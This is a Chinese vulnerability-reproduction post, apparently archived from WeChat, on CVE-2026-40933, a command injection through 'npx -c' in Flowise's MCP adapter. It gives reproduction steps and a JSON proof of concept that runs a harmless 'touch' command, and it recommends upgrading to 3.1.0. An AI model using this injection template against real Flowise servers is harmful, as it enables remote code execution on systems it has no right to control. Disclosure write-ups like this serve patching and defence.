---
cve: "CVE-2026-40933"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  【漏洞复现】Flowise 中通过 MCP 适配器实现远程代码执行漏洞（CVE-2026-40933）  
 信通云服   2026-04-22 08:38  
  
# 【漏洞描述】  
# 组件介绍  
  
Flowise是一个开源的可视化低代码平台，用于快速构建基于大语言模型（LLM）的AI应用。  
# 漏洞简介  
  
在 Flowise 3.0.13 及更早版本中，MCP 适配器对 stdio 命令的清理存在缺陷，允许已通过身份验证的攻击者在自定义 MCP 配置中，通过 npx -c 等看似合法的命令注入任意操作系统指令，从而实现远程代码执行，攻击者可在底层服务器上执行任意命令。该漏洞已在 3.1.0 版本中修复。  
# 【漏洞复现】  
  
进入  
Chatflows页面  
创建一个新的自定义MCP，并添加“npx -c”命令。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tOrb0WDic7iciaGw0bebrG3MVeyOAkYeOXBcOEokpqQSwcS31JJF4icVxTrsmicglv4hKQiadkKHaRMcmIH3AX0l7JrA2tLDWm6dToq8KA2bRz66s/640?wx_fmt=png&from=appmsg "")  
  
poc  
```
{
    "command": "npx",
    "args": [
        "-c",
        "touch /tmp/pwn"
    ]
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tOrb0WDic7iciaFD7CCV2Jk6GVmazdPFicvM0f8T4g6EDAVF03N7rGTS8xbmrB7KoyT7oa8l1FM0t9h5c6CCb1e19FHX1IaT0Wglj7jy4aiaafy0/640?wx_fmt=png&from=appmsg "")  
  
成功执行touch /tmp/test命令创建test文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tOrb0WDic7icjyDQPt5fE7fMCxR8LkPo93LW3AbCSgLxJPSZRib8z7eIJORY87cLicPCFmrR5okJMqhWrosM7IlEglHk4Z7rqv3Oic0tH0W9frG0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tOrb0WDic7icjgicV7Zd6PtNsAm6orPiaBH6tI37ENnZMQdauNaZBGhfGejFARCjKStMtnSFfnK8PJibn3Yly7rqP2ksro1xqotNic1XCT0Urtdgk/640?wx_fmt=png&from=appmsg "")  
# 【修复建议】  
  
升级至 3.1.0 或更高版本  
  
【  
参考链接  
】  
  
https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp  
  
https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem  
  
https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-c9gw-hvqq-f33r  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
